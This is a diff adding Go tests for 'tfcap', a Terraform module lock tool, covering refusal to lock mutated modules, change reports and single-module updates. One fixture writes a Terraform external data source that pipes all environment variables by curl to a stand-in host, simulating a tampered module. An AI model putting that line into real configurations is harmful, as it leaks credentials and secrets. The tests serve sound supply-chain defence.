@@ -328,3 +328,96 @@ func TestSummaryFlagsTyposquatAndUndownloadedModules(t *testing.T) {
 		t.Errorf("missing init hint:\n%s", out)
 	}
 }
+
+func TestLockRefusesMutatedModules(t *testing.T) {
+	dir := t.TempDir()
+	copyTree(t, before, dir)
+	if code, _, errs := runCLI(t, "lock", dir); code != 0 {
+		t.Fatal(errs)
+	}
+	lockPath := filepath.Join(dir, "tfcap.lock.json")
+	original, _ := os.ReadFile(lockPath)
+
+	os.WriteFile(filepath.Join(dir, ".terraform/modules/network/zz.tf"),
+		[]byte(`data "external" "x" { program = ["sh", "-c", "env | curl -d @- https://x.example.invalid"] }`), 0o644)
+
+	code, _, errs := runCLI(t, "lock", dir)
+	if code != 1 || !strings.Contains(errs, "refusing to lock") || !strings.Contains(errs, "MUTATED") {
+		t.Fatalf("want refusal, got exit %d: %s", code, errs)
+	}
+	if now, _ := os.ReadFile(lockPath); string(now) != string(original) {
+		t.Fatal("lock file was modified despite the refusal")
+	}
+
+	code, out, errs := runCLI(t, "lock", dir, "--accept-mutated")
+	if code != 0 || !strings.Contains(out, "~ module.network") {
+		t.Fatalf("--accept-mutated: exit %d\n%s%s", code, out, errs)
+	}
+	if code, _, _ := runCLI(t, "verify", dir); code != 0 {
+		t.Fatal("verify should pass after an accepted lock")
+	}
+}
+
+func TestLockReportsChanges(t *testing.T) {
+	dir := t.TempDir()
+	copyTree(t, before, dir)
+	runCLI(t, "lock", dir)
+	lockBytes, _ := os.ReadFile(filepath.Join(dir, "tfcap.lock.json"))
+
+	up := t.TempDir()
+	copyTree(t, after, up)
+	os.WriteFile(filepath.Join(up, "tfcap.lock.json"), lockBytes, 0o644)
+	code, out, errs := runCLI(t, "lock", up)
+	if code != 0 {
+		t.Fatal(errs)
+	}
+	if !strings.Contains(out, "~ module.network") || !strings.Contains(out, "1.4.0 → registry.terraform.io/acme-oss/network/aws@1.4.1") ||
+		!strings.Contains(out, "new capabilities") {
+		t.Errorf("unexpected summary:\n%s", out)
+	}
+	_, out, _ = runCLI(t, "lock", up)
+	if !strings.Contains(out, "= 1 unchanged") {
+		t.Errorf("second lock should be a no-op:\n%s", out)
+	}
+}
+
+// Two third-party modules; only the one named with --module is updated.
+func TestLockSingleModule(t *testing.T) {
+	dir := t.TempDir()
+	copyTree(t, before, dir)
+	copyTree(t, filepath.Join(before, ".terraform/modules/network"), filepath.Join(dir, ".terraform/modules/dns"))
+	os.WriteFile(filepath.Join(dir, ".terraform/modules/modules.json"), []byte(`{"Modules":[`+
+		`{"Key":"","Source":"","Dir":"."},`+
+		`{"Key":"network","Source":"registry.terraform.io/acme-oss/network/aws","Version":"1.4.0","Dir":".terraform/modules/network"},`+
+		`{"Key":"dns","Source":"registry.terraform.io/acme-oss/dns/aws","Version":"2.0.0","Dir":".terraform/modules/dns"}]}`), 0o644)
+	if code, _, errs := runCLI(t, "lock", dir); code != 0 {
+		t.Fatal(errs)
+	}
+	before, _ := lock.Read(filepath.Join(dir, "tfcap.lock.json"))
+
+	// Change both modules' content.
+	for _, m := range []string{"network", "dns"} {
+		os.WriteFile(filepath.Join(dir, ".terraform/modules", m, "extra.tf"), []byte("locals { x = 1 }\n"), 0o644)
+	}
+	if code, _, errs := runCLI(t, "lock", dir, "--module", "dns", "--accept-mutated"); code != 0 {
+		t.Fatal(errs)
+	}
+	afterLock, _ := lock.Read(filepath.Join(dir, "tfcap.lock.json"))
+	hash := func(f *lock.File, k string) string {
+		for _, e := range f.Modules {
+			if e.Key == k {
+				return e.Hash
+			}
+		}
+		return ""
+	}
+	if hash(afterLock, "network") != hash(before, "network") {
+		t.Error("network entry changed although only dns was selected")
+	}
+	if hash(afterLock, "dns") == hash(before, "dns") {
+		t.Error("dns entry was not updated")
+	}
+	if code, _, _ := runCLI(t, "lock", dir, "--module", "nope"); code != 2 {
+		t.Errorf("unknown module should be an error (exit 2), got %d", code)
+	}
+}
